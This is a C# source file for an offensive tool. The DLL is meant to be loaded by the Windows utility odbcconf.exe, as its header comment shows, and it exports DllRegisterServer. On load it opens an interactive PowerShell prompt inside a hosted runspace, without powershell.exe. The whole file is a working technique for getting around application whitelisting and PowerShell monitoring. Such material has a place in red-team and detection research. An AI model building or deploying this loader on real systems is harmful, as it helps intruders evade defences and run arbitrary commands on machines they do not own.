//odbcconf.exe /F file.rsp

using System;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using odbc;

public class Test
{

    [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
    public static bool DllRegisterServer()
    {
        while (true)
        {
            AllocConsole();
            IntPtr defaultStdout = new IntPtr(7);
            IntPtr currentStdout = GetStdHandle(StdOutputHandle);
            Console.Write("PS >");
            string x = Console.ReadLine();
            try
            {
                Console.WriteLine(RunPSCommand(x));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
        return true;
    }
    //Based on Jared Atkinson's And Justin Warner's Work
    public static string RunPSCommand(string cmd)
    {
        //Init stuff
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
        Pipeline pipeline = runspace.CreatePipeline();

        //Add commands
        pipeline.Commands.AddScript(cmd);

        //Prep PS for string output and invoke
        pipeline.Commands.Add("Out-String");
        Collection<PSObject> results = pipeline.Invoke();
        runspace.Close();

        //Convert records to strings
        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj.ToString().TrimEnd('\r', '\n'));
        }
        return stringBuilder.ToString().Trim();
    }

    public static void RunPSFile(string script)
    {
        PowerShell ps = PowerShell.Create();
        ps.AddScript(script).Invoke();
    }

    private const UInt32 StdOutputHandle = 0xFFFFFFF5;
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetStdHandle(UInt32 nStdHandle);
    [DllImport("kernel32.dll")]
    private static extern void SetStdHandle(UInt32 nStdHandle, IntPtr handle);
    [DllImport("kernel32")]
    static extern bool AllocConsole();

}